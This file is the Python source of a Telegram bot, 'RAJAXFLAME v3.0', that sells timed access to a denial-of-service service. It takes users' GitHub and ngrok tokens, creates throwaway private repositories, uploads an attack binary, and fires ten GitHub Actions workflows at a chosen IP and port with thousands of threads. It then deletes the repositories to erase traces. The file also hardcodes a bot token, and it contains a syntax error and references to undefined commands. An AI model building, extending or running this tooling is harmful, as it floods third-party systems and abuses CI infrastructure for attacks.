import os
import json
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
    InputMediaPhoto,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ================ 🌟 ENHANCED CONFIGURATION 🌟 ================
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8457763206:AAE_o4kb-RRjA0ChqVFHc8t_6Qd7vcHXo1A")
DEVELOPER _TAG = "🔥 @BITCH_lI_mBACK  🔥"
OWNER_IDS = {7848273230}

# File paths
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json" 
GITHUB_TOKENS_FILE = "github_tokens.txt"
NGROK_TOKENS_FILE = "ngrok_tokens.txt"
ATTACK_LOGS_FILE = "attack_logs.json"

BINARY_NAME = "soul"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)

# Enhanced tracking
ATTACK_STATUS: Dict[int, Dict[str, Any]] = {}
ACTIVE_TUNNELS: Dict[str, Any] = {}

# ================ 🎨 STYLISH DESIGN CONSTANTS 🎨 ================
BANNERS = {
    "welcome": """
╔══════════════════════════════╗
║    🚀 **RAJAXFLAME v3.0**    ║
║    ⚡ **ULTRA ADVANCED**     ║
║    🔥 **10x WORKFLOWS**     ║
╚══════════════════════════════╝
    """,
    
    "attack_start": """
╔══════════════════════════════╗
║    🎯 **RAJAXFLAME FIRED**   ║
║    ⚡ **10x WORKFLOWS**      ║
║    🔥 **NGROK TUNNEL**      ║
╚══════════════════════════════╝
    """,
    
    "status": """
╔══════════════════════════════╗
║    📊 **RAJAXFLAME STATUS**  ║
║    🔥 **REAL-TIME**         ║
╚══════════════════════════════╝
    """
}

ANIME_PICS = [
    "https://wallpapercave.com/wp/wp13025001.jpg",
    "https://wallpapercave.com/wp/wp13024996.jpg", 
    "https://wallpapercave.com/wp/wp13024994.jpg",
    "https://wallpapercave.com/wp/wp13024992.jpg"
]

# ================ 🔧 ENHANCED UTILITIES 🔧 ================
def load_json(path: str, default: Any) -> Any:
    """Load JSON with error handling"""
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    """Save JSON with proper formatting"""
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_owner(user_id: int) -> bool:
    """Check if user is owner"""
    return user_id in OWNER_IDS

def get_admins() -> set:
    """Get admin list"""
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    """Add admin"""
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    """Get approved users"""
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    """Check if user is approved"""
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    """Add approved user"""
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    """Remove user"""
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

# ================ 🔐 TOKEN MANAGEMENT 🔐 ================
def save_github_token(uid: int, token: str) -> None:
    """Save GitHub token"""
    with open(GITHUB_TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def save_ngrok_token(uid: int, token: str) -> None:
    """Save Ngrok token"""  
    with open(NGROK_TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def load_github_tokens() -> List[str]:
    """Load all GitHub tokens"""
    if not os.path.exists(GITHUB_TOKENS_FILE):
        return []
    with open(GITHUB_TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def load_ngrok_tokens() -> List[str]:
    """Load all Ngrok tokens"""
    if not os.path.exists(NGROK_TOKENS_FILE):
        return []
    with open(NGROK_TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def get_user_github_tokens(user_id: int) -> List[str]:
    """Get GitHub tokens for specific user"""
    return [ln.split(":", 1)[1] for ln in load_github_tokens() if ln.startswith(f"{user_id}:")]

def get_user_ngrok_tokens(user_id: int) -> List[str]:
    """Get Ngrok tokens for specific user"""
    return [ln.split(":", 1)[1] for ln in load_ngrok_tokens() if ln.startswith(f"{user_id}:")]

# ================ 🌐 GITHUB API FUNCTIONS 🌐 ================
def gh_headers(token: str) -> Dict[str, str]:
    """GitHub API headers"""
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    """Create GitHub repository"""
    r = requests.post(
        "https://api.github.com/user/repos",
        headers=gh_headers(token),
        json={"name": name, "private": True, "auto_init": False},
        timeout=30
    )
    return r.json() if r.status_code in (201, 202) else None

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    """Upload file to GitHub"""
    b64 = base64.b64encode(content_bytes).decode()
    r = requests.put(
        f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
        headers=gh_headers(token),
        json={"message": message, "content": b64},
        timeout=30
    )
    return r.status_code in (201, 200)

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    """Dispatch GitHub workflow"""
    r = requests.post(
        f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
        headers=gh_headers(token),
        json={"ref": ref},
        timeout=30
    )
    return r.status_code in (204, 201)

def validate_github_token(token: str) -> bool:
    """Validate GitHub token"""
    r = requests.get("https://api.github.com/user", headers=gh_headers(token), timeout=20)
    return r.status_code == 200

def gh_delete_repo(token: str, full_name: str) -> bool:
    """Delete GitHub repository"""
    r = requests.delete(
        f"https://api.github.com/repos/{full_name}",
        headers=gh_headers(token),
        timeout=30
    )
    return r.status_code == 204

# ================ 🔗 NGROK API FUNCTIONS 🔗 ================
def ngrok_headers(token: str) -> Dict[str, str]:
    """Ngrok API headers"""
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

def create_ngrok_tunnel(token: str, port: int = 80) -> Optional[Dict[str, Any]]:
    """Create Ngrok TCP tunnel"""
    r = requests.post(
        "https://api.ngrok.com/tunnels",
        headers=ngrok_headers(token),
        json={
            "name": f"rajaxflame-tunnel-{random.randint(1000,9999)}",
            "proto": "tcp",
            "addr": port,
            "metadata": f"rajaxflame-{int(time.time())}"
        },
        timeout=30
    )
    return r.json() if r.status_code == 201 else None

def validate_ngrok_token(token: str) -> bool:
    """Validate Ngrok token"""
    r = requests.get(
        "https://api.ngrok.com/credentials",
        headers=ngrok_headers(token),
        timeout=20
    )
    return r.status_code == 200

def delete_ngrok_tunnel(token: str, tunnel_id: str) -> bool:
    """Delete Ngrok tunnel"""
    r = requests.delete(
        f"https://api.ngrok.com/tunnels/{tunnel_id}",
        headers=ngrok_headers(token),
        timeout=20
    )
    return r.status_code == 204

# ================ ⚡ WORKFLOW BUILDERS ⚡ ================
def build_rajaxflame_workflows(ip: str, port: str, duration: str, threads: int) -> Dict[str, str]:
    """Build 10 different workflows for RAJAXFLAME attack"""
    
    workflows = {}
    
    # Main RAJAXFLAME matrix workflow (5 concurrent sessions)
    main_wf = {
        "name": "🚀 RAJAXFLAME MAIN ATTACK",
        "on": {"workflow_dispatch": {}},
        "jobs": {
            "rajaxflame-massive": {
                "runs-on": "ubuntu-latest",
                "strategy": {
                    "fail-fast": False, 
                    "matrix": {
                        "session": [1, 2, 3, 4, 5],
                        "include": [
                            {"session": 1, "threads": threads},
                            {"session": 2, "threads": threads},
                            {"session": 3, "threads": threads},
                            {"session": 4, "threads": threads},
                            {"session": 5, "threads": threads}
                        ]
                    }
                },
                "steps": [
                    {
                        "name": "⚡ RAJAXFLAME Setup",
                        "uses": "actions/checkout@v4"
                    },
                    {
                        "name": "🔧 Prepare Binary",
                        "run": f"chmod +x {BINARY_NAME}"
                    },
                    {
                        "name": "🎯 Launch RAJAXFLAME",
                        "run": f"./{BINARY_NAME} {ip} {port} {duration} ${{{{ matrix.threads }}}}"
                    }
                ]
            }
        }
    }
    workflows["rajaxflame_main.yml"] = yaml.dump(main_wf, default_flow_style=False, allow_unicode=True, sort_keys=False)
    
    # Additional RAJAXFLAME specialized workflows
    workflow_configs = {
        "rajaxflame_wave1.yml": {"name": "🔥 RAJAXFLAME WAVE 1", "threads": threads},
        "rajaxflame_wave2.yml": {"name": "⚡ RAJAXFLAME WAVE 2", "threads": threads + 1000},
        "rajaxflame_wave3.yml": {"name": "💀 RAJAXFLAME WAVE 3", "threads": threads + 2000},
        "rajaxflame_wave4.yml": {"name": "🚀 RAJAXFLAME WAVE 4", "threads": threads},
        "rajaxflame_wave5.yml": {"name": "🌪️ RAJAXFLAME WAVE 5", "threads": threads + 1500},
        "rajaxflame_wave6.yml": {"name": "🔥 RAJAXFLAME WAVE 6", "threads": threads},
        "rajaxflame_wave7.yml": {"name": "⚡ RAJAXFLAME WAVE 7", "threads": threads + 1000},
        "rajaxflame_wave8.yml": {"name": "💀 RAJAXFLAME WAVE 8", "threads": threads + 2500},
        "rajaxflame_ultimate.yml": {"name": "🎯 RAJAXFLAME ULTIMATE", "threads": threads + 3000}
    }
    
    for wf_file, config in workflow_configs.items():
        wf_config = {
            "name": config["name"],
            "on": {"workflow_dispatch": {}},
            "jobs": {
                "rajaxflame-attack": {
                    "runs-on": "ubuntu-latest",
                    "steps": [
                        {
                            "name": "⚡ RAJAXFLAME Setup",
                            "uses": "actions/checkout@v4"
                        },
                        {
                            "name": "🔧 Prepare Binary", 
                            "run": f"chmod +x {BINARY_NAME}"
                        },
                        {
                            "name": f"🎯 {config['name']}",
                            "run": f"./{BINARY_NAME} {ip} {port} {duration} {config['threads']}"
                        }
                    ]
                }
            }
        }
        workflows[wf_file] = yaml.dump(wf_config, default_flow_style=False, allow_unicode=True, sort_keys=False)
    
    return workflows

# ================ 🎭 ANIMATION & DESIGN 🎭 ================
async def send_rajaxflame_message(context, chat_id: int, text: str, banner_type: str = "welcome"):
    """Send messages with RAJAXFLAME formatting"""
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=formatted_text,
            parse_mode='HTML'
        )
    except Exception as e:
        print(f"Error sending message: {e}")

async def send_rajaxflame_photo(context, chat_id: int, text: str, banner_type: str = "welcome"):
    """Send message with RAJAXFLAME anime photo"""
    formatted_text = f"{BANNERS[banner_type]}\n{text}"
    
    try:
        profile_pic = random.choice(ANIME_PICS)
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=profile_pic,
            caption=formatted_text,
            parse_mode='HTML'
        )
    except Exception:
        await send_rajaxflame_message(context, chat_id, text, banner_type)

async def animate_rajaxflame_progress(context, chat_id: int, duration: int):
    """Show animated progress during RAJAXFLAME attack"""
    progress_bars = [
        "🟥⬜⬜⬜⬜⬜⬜⬜⬜⬜ 10%",
        "🟥🟥⬜⬜⬜⬜⬜⬜⬜⬜ 20%", 
        "🟥🟥🟥⬜⬜⬜⬜⬜⬜⬜ 30%",
        "🟥🟥🟥🟥⬜⬜⬜⬜⬜⬜ 40%",
        "🟥🟥🟥🟥🟥⬜⬜⬜⬜⬜ 50%",
        "🟥🟥🟥🟥🟥🟥⬜⬜⬜⬜ 60%",
        "🟥🟥🟥🟥🟥🟥🟥⬜⬜⬜ 70%",
        "🟥🟥🟥🟥🟥🟥🟥🟥⬜⬜ 80%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥⬜ 90%",
        "🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥 100%"
    ]
    
    msg = await context.bot.send_message(chat_id, "🚀 **RAJAXFLAME PROGRESS STARTING...**")
    
    interval = max(1, duration / len(progress_bars))
    for progress in progress_bars:
        await asyncio.sleep(interval)
        try:
            await msg.edit_text(f"⏳ **RAJAXFLAME PROGRESS:** {progress}")
        except Exception:
            pass
    
    return msg

# ================ 🎯 RAJAXFLAME ATTACK HANDLER 🎯 ================
async def cmd_rajaxflame(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """RAJAXFLAME attack with 10 workflows and ngrok tunnel"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Authorization check
    if not is_user_approved(user_id):
        await send_rajaxflame_message(
            context, chat_id, 
            f"❌ **ACCESS DENIED**\n\nContact Developer: {DEVELOPER_TAG}",
            "status"
        )
        return
    
    # Validate command arguments
    if len(context.args) != 3:
        await send_rajaxflame_message(
            context, chat_id,
            "💡 **USAGE:** `/rajaxflame IP PORT DURATION`\n\nExample: `/rajaxflame 1.1.1.1 80 120`",
            "status"
        )
        return
    
    ip, port, duration = context.args
    
    # Input validation
    try:
        port = int(port)
        duration = int(duration)
        if duration > 300:  # Max 5 minutes
            await update.message.reply_text("❌ Duration must be 300 seconds or less")
            return
    except ValueError:
        await update.message.reply_text("❌ PORT and DURATION must be valid numbers")
        return
    
    # Check binary
    if not os.path.exists(BINARY_PATH):
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **BINARY MISSING**\n\nAdmin must upload binary via /file command",
            "status"
        )
        return
    
    # Get tokens
    github_tokens = get_user_github_tokens(user_id)
    ngrok_tokens = get_user_ngrok_tokens(user_id)
    
    valid_github = [t for t in github_tokens if validate_github_token(t)]
    valid_ngrok = [t for t in ngrok_tokens if validate_ngrok_token(t)]
    
    if not valid_github:
        await send_rajaxflame_message(
            context, chat_id,
            "❌ **NO VALID GITHUB TOKENS**\n\nUse /setgithub to add tokens first",
            "status"
        )
        return
    
    # Start RAJAXFLAME attack process
    attack_msg = await update.message.reply_text("🚀 **INITIATING RAJAXFLAME ATTACK...**")
    
    # Create ngrok tunnel
    tunnel_url = None
    tunnel_id = None
    if valid_ngrok:
        try:
            ngrok_token = random.choice(valid_ngrok)
            await attack_msg.edit_text("🔗 **CREATING RAJAXFLAME TUNNEL...**")
            
            tunnel_data = create_ngrok_tunnel(ngrok_token, port)
            if tunnel_data and 'public_url' in tunnel_data:
                tunnel_url = tunnel_data['public_url']
                tunnel_id = tunnel_data['id']
                ACTIVE_TUNNELS[chat_id] = {
                    'data': tunnel_data,
                    'token': ngrok_token
                }
                await attack_msg.edit_text(f"✅ **RAJAXFLAME TUNNEL CREATED:** `{tunnel_url}`")
            else:
                await attack_msg.edit_text("⚠️ **RAJAXFLAME TUNNEL CREATION FAILED**")
        except Exception as e:
            await attack_msg.edit_text(f"⚠️ **RAJAXFLAME TUNNEL FAILED:** {str(e)}")
    
    # Prepare attack target
    attack_target = tunnel_url if tunnel_url else ip
    target_port = "443" if tunnel_url else str(port)
    
    # Build 10 RAJAXFLAME workflows
    await attack_msg.edit_text("🔨 **BUILDING RAJAXFLAME WORKFLOWS...**")
    workflows = build_rajaxflame_workflows(attack_target, target_port, str(duration), 4000)
    
    # Select random GitHub token
    github_token = random.choice(valid_github)
    repo_name = f"rajaxflame-{random.randint(100000, 999999)}"
    
    # Create repository
    await attack_msg.edit_text("📁 **CREATING RAJAXFLAME REPOSITORY...**")
    repo_data = gh_create_repo(github_token, repo_name)
    
    if not repo_data:
        await attack_msg.edit_text("❌ **FAILED TO CREATE RAJAXFLAME REPOSITORY**")
        return
    
    owner = repo_data['owner']['login']
    full_repo_name = repo_data['full_name']
    
    # Upload binary
    await attack_msg.edit_text("📦 **UPLOADING RAJAXFLAME BINARY...**")
    with open(BINARY_PATH, "rb") as f:
        binary_data = f.read()
    
    if not gh_put_file(github_token, owner, repo_name, BINARY_NAME, binary_data, "Add RAJAXFLAME binary"):
        await attack_msg.edit_text("❌ **FAILED TO UPLOAD RAJAXFLAME BINARY**")
        gh_delete_repo(github_token, full_repo_name)
        return
    
    # Upload all 10 RAJAXFLAME workflows
    await attack_msg.edit_text("⚡ **UPLOADING RAJAXFLAME WORKFLOWS...**")
    successful_workflows = 0
    
    for wf_name, wf_content in workflows.items():
        wf_path = f".github/workflows/{wf_name}"
        if gh_put_file(github_token, owner, repo_name, wf_path, wf_content.encode('utf-8'), f"Add {wf_name}"):
            successful_workflows += 1
        await asyncio.sleep(1)  # Avoid rate limiting
    
    # Dispatch all RAJAXFLAME workflows
    await attack_msg.edit_text("🎯 **DEPLOYING RAJAXFLAME WORKFLOWS...**")
    dispatched_workflows = 0
    
    for wf_name in workflows.keys():
        if gh_dispatch_workflow(github_token, owner, repo_name, wf_name):
            dispatched_workflows += 1
        await asyncio.sleep(2)  # Avoid rate limiting
    
    # Update RAJAXFLAME attack status
    until_time = datetime.utcnow() + timedelta(seconds=duration + 30)
    ATTACK_STATUS[chat_id] = {
        "running": True,
        "until": until_time,
        "target": f"{attack_target}:{target_port}",
        "workflows_uploaded": successful_workflows,
        "workflows_dispatched": dispatched_workflows,
        "repo": full_repo_name,
        "start_time": datetime.utcnow().isoformat(),
        "github_token": github_token[:8] + "...",
        "tunnel_used": tunnel_url is not None
    }
    
    # Final RAJAXFLAME success message
    success_report = f"""
🎯 **RAJAXFLAME ATTACK DEPLOYED SUCCESSFULLY!**

📊 **RAJAXFLAME REPORT:**
✅ Workflows Uploaded: {successful_workflows}/10
✅ Workflows Deployed: {dispatched_workflows}/10  
🎯 Target: `{attack_target}:{target_port}`
⏱ Duration: {duration} seconds
🕒 Ends: {until_time.strftime('%H:%M:%S UTC')}

🔰 **MODE:** {'🔥 RAJAXFLAME TUNNEL + 10x WORKFLOWS' if tunnel_url else '⚡ RAJAXFLAME DIRECT + 10x WORKFLOWS'}
📁 Repository: `{repo_name}`
🔑 Token: `{github_token[:12]}...`

💀 **RAJAXFLAME ACTIVATED - TARGET WILL BE DESTROYED!**
    """
    
    await attack_msg.delete()
    await send_rajaxflame_photo(context, chat_id, success_report, "attack_start")
    
    # Start RAJAXFLAME progress animation
    asyncio.create_task(animate_rajaxflame_progress(context, chat_id, duration))
    
    # Schedule RAJAXFLAME cleanup
    asyncio.create_task(rajaxflame_cleanup(chat_id, github_token, full_repo_name, tunnel_id, duration))

async def rajaxflame_cleanup(chat_id: int, token: str, repo: str, tunnel_id: Optional[str], duration: int):
    """RAJAXFLAME cleanup after attack completes"""
    await asyncio.sleep(duration + 10)
    
    # Delete RAJAXFLAME repository
    try:
        gh_delete_repo(token, repo)
    except Exception:
        pass
    
    # Delete RAJAXFLAME tunnel if exists
    if tunnel_id and chat_id in ACTIVE_TUNNELS:
        try:
            ngrok_token = ACTIVE_TUNNELS[chat_id]['token']
            delete_ngrok_tunnel(ngrok_token, tunnel_id)
        except Exception:
            pass
    
    # Update RAJAXFLAME status
    if chat_id in ATTACK_STATUS:
        ATTACK_STATUS[chat_id]["running"] = False

# ================ 🎪 RAJAXFLAME COMMAND HANDLERS 🎪 ================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """RAJAXFLAME start command with stylish welcome"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    
    welcome_text = f"""
✨ **WELCOME TO RAJAXFLAME v3.0** ✨

👤 **User:** {user.first_name}
🆔 **ID:** `{user.id}`
🔰 **Status:** {'✅ APPROVED' if is_user_approved(user.id) else '❌ PENDING'}

🚀 **RAJAXFLAME FEATURES:**
• 10x Workflows Simultaneous Attack
• Ngrok Tunnel Integration  
• Professional UI/UX Design
• Real-time Status Updates
• Advanced Token Management

📚 **RAJAXFLAME Commands:**
/setgithub - Add GitHub Tokens
/setngrok - Add Ngrok Tokens  
/rajaxflame - Launch RAJAXFLAME Attack

👨‍💻 **Developer:** {DEVELOPER_TAG}
    """
    
    await send_rajaxflame_photo(context, chat_id, welcome_text, "welcome")

async def cmd_setgithub(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set GitHub tokens for RAJAXFLAME"""
    user_id = update.effective_user.id
    
    if update.message.document and update.message.document.file_name.endswith(".txt"):
        # File upload
        file = await update.message.document.get_file()
        path = await file.download_to_drive()
        
        count = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                token = line.strip()
                if token and len(token) > 10:
                    save_github_token(user_id, token)
                    count += 1
        
        os.remove(path)
        await update.message.reply_text(f"✅ **RAJAXFLAME SAVED {count} GITHUB TOKENS**")
        
    else:
        # Text tokens
        text = update.message.text.replace("/setgithub", "").strip()
        if not text:
            await update.message.reply_text("💡 **Send GitHub PAT tokens or upload .txt file**")
            return
        
        tokens = [t.strip() for t in text.split() if t.strip()]
        for token in tokens:
            save_github_token(user_id, token)
        
        await update.message.reply_text(f"✅ **RAJAXFLAME SAVED {len(tokens)} GITHUB TOKENS**")

async def cmd_setngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set Ngrok tokens for RAJAXFLAME"""
    user_id = update.effective_user.id
    text = update.message.text.replace("/setngrok", "").strip()
    
    if not text:
        await update.message.reply_text("💡 **Send Ngrok auth token**")
        return
    
    save_ngrok_token(user_id, text)
    await update.message.reply_text("✅ **RAJAXFLAME NGROK TOKEN SAVED**")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """RAJAXFLAME status command"""
    chat_id = update.effective_chat.id
    status = ATTACK_STATUS.get(chat_id, {})
    
    if status.get("running"):
        time_left = status["until"] - datetime.utcnow()
        status_text = f"""
📊 **RAJAXFLAME LIVE STATUS**

🎯 Target: `{status['target']}`
⚡ Workflows: {status['workflows_dispatched']}/10
⏱ Time Left: {int(time_left.total_seconds())}s
🕒 Started: {status['start_time'][11:19]} UTC
📁 Repository: `{status['repo']}`
🔑 Token: `{status['github_token']}`
🌐 Tunnel: {'✅ YES' if status['tunnel_used'] else '❌ NO'}

🔥 **RAJAXFLAME ATTACK IN PROGRESS**
        """
    else:
        status_text = "💤 **NO ACTIVE RAJAXFLAME ATTACKS**\n\nUse `/rajaxflame IP PORT DURATION` to start"
    
    await send_rajaxflame_message(context, chat_id, status_text, "status")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """RAJAXFLAME help command"""
    help_text = """
🤖 **RAJAXFLAME v3.0 - COMMANDS**

🔹 **Basic Commands**
/start - Start RAJAXFLAME bot
/help - Show this help message  
/status - Check RAJAXFLAME status

🔹 **Token Management**
/setgithub - Add GitHub Personal Access Token
/setngrok - Add Ngrok Auth Token

🔹 **RAJAXFLAME Attack Commands**
/rajaxflame IP PORT DURATION - Launch RAJAXFLAME attack
Example: /rajaxflame 1.1.1.1 80 120

🔹 **Admin Commands**
/add USERID DAYS - Add approved user
/remove USERID - Remove user
/users - Show all users
    """
    
    if is_admin(update.effective_user.id):
        help_text += "\n🔹 **Owner Commands**\n/addadmin USERID - Add admin\n/removeadmin USERID - Remove admin"
    
    await update.message.reply_text(help_text, parse_mode='HTML')

# ================ 👑 RAJAXFLAME ADMIN COMMANDS 👑 ================
async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add approved user to RAJAXFLAME"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /add USERID DAYS")
        return
    
    try:
        target_user = int(context.args[0])
        days = int(context.args[1])
        
        add_user(target_user, days)
        await update.message.reply_text(f"✅ **RAJAXFLAME USER {target_user} ADDED FOR {days} DAYS**")
    except ValueError:
        await update.message.reply_text("❌ **RAJAXFLAME INVALID USERID OR DAYS**")

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user from RAJAXFLAME"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /remove USERID")
        return
    
    try:
        target_user = int(context.args[0])
        remove_user(target_user)
        await update.message.reply_text(f"✅ **RAJAXFLAME USER {target_user} REMOVED**")
    except ValueError:
        await update.message.reply_text("❌ **RAJAXFLAME INVALID USERID**")

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add admin to RAJAXFLAME"""
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ **RAJAXFLAME OWNER ACCESS REQUIRED**")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /addadmin USERID")
        return
    
    try:
        target_user = int(context.args[0])
        add_admin(target_user)
        await update.message.reply_text(f"✅ **RAJAXFLAME ADMIN {target_user} ADDED**")
    except ValueError:
        await update.message.reply_text("❌ **RAJAXFLAME INVALID USERID**")

# ================ 🏗️ RAJAXFLAME APPLICATION BUILDER 🏗️ ================
def build_rajaxflame_app():
    """Build RAJAXFLAME Telegram application"""
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("rajaxflame", cmd_rajaxflame))
    app.add_handler(CommandHandler("setgithub", cmd_setgithub))
    app.add_handler(CommandHandler("setngrok", cmd_setngrok))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
    
    return app

if __name__ == "__main__":
    # Enhanced logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    print("""
╔══════════════════════════════╗
║    🚀 **RAJAXFLAME v3.0**   ║  
║    ⚡ **ULTRA ADVANCED**    ║
║    🔥 **10x WORKFLOWS**    ║
╚══════════════════════════════╝
    """)
    
    app = build_rajaxflame_app()
    app.run_polling()